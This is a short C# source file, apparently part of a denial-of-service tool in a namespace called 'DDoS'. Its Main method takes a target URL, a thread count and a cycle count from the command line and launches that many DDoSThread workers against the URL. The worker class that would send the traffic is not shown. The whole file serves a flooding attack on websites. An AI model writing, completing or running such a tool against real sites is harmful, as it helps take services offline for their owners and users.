namespace DDoS
{
    class Program
    {
        static void Main(string[] args)
        {
            string
                url,
                numberOfThreadsStr,
                numberOfCyclesStr;

            ulong
                numberOfThreads,
                numberOfCycles;

            if(string.IsNullOrEmpty(url = args[0])
                || string.IsNullOrEmpty(numberOfThreadsStr=args[1])
                || string.IsNullOrEmpty(numberOfCyclesStr = args[2])
                || !ulong.TryParse(numberOfThreadsStr, out numberOfThreads)
                || !ulong.TryParse(numberOfCyclesStr, out numberOfCycles))
                return;

            for (ulong i = 0; i < numberOfThreads; ++i)
                new DDoSThread(i, url, numberOfCycles, false);
        }
    }
}
